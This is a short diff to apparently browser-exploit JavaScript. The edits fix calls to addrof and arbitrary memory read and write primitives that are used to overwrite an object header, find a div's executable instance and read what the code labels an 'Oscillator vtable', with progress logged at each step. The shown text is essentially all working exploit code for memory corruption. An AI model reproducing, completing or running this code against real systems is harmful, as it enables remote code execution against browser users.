@@ -636,7 +636,7 @@ var VM_PROT_EXECUTE = 0x4
     // Testing code, not related to exploit
     var plainObj = {};
     var header = memory.read64(addrof(plainObj));
-    memory.writeInt64(addrof(container), header);
+    memory.writeInt64(memory.addrof(container), header);
     //memory.test();
     //let memory.read_i64 = memory.read64;
      
@@ -651,7 +651,7 @@ var VM_PROT_EXECUTE = 0x4
         let ad_div = addrof(d);
         log('[+] Address of the div is '+ad_div.toString(16));
         //alert(FPO)
-        let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
+        let exe_ptr = memory.read_i64(Add(ad_div, FPO));
         log('[+] Executable instance is at '+exe_ptr.toString(16));
         let v_tlb = memory.read_i64(exe_ptr);
         log('[+] Oscillator vtable seems to be at '+v_tlb.toString(16));
